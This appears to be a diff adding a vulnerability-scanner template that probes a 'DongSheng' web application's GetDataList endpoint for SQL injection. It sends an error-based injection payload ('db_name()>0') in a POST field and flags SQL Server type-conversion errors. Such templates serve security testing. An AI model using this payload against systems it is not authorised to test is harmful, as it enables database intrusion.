@@ -1,0 +1,31 @@
+id: DongSheng-GetDataList-sqlInjection
+
+info:
+  name: DongSheng-GetDataList-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    DongSheng-GetDataList-sqlInjection
+
+http:
+  - raw:
+      - |
+        POST /Account/Chfee_hexiao/GetDataList HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        start=0&condition=db_name()>0&limit=10
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "数据类型"
+          - "int"
+        condition: and
+
+      - type: status
+        status:
+          - 500
